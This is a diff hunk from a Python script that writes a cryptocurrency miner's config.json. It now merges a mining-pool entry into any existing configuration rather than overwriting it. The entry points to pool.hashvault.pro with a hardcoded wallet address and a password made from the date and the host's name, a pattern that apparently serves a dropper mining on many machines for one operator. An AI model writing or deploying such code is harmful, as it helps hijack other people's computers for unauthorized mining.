@@ -112,17 +112,32 @@ def download_and_extract(url, dest_dir):
 
 def update_config_json(extracted_dir):
     config_path = os.path.join(extracted_dir, "config.json")
-    config = {
-        "pools": [
-            {
-                "url": "pool.hashvault.pro:443",
-                "user": "4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu",
-                "pass": f"{datetime.now():%Y%m%d}{socket.gethostname()}",
-                "tls": True,
-                "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
-            }
-        ]
+
+    if os.path.exists(config_path):
+        with open(config_path, "r") as f:
+            try:
+                config = json.load(f)
+            except json.JSONDecodeError:
+                config = {}
+    else:
+        config = {}
+
+    if "pools" not in config or not isinstance(config["pools"], list):
+        config["pools"] = []
+
+    pool = {
+        "url": "pool.hashvault.pro:443",
+        "user": "4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu",
+        "pass": f"{datetime.now():%Y%m%d}{socket.gethostname()}",
+        "tls": True,
+        "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
     }
+
+    if config["pools"]:
+        config["pools"][0].update(pool)
+    else:
+        config["pools"].append(pool)
+
     with open(config_path, "w") as f:
         json.dump(config, f, indent=4)
 
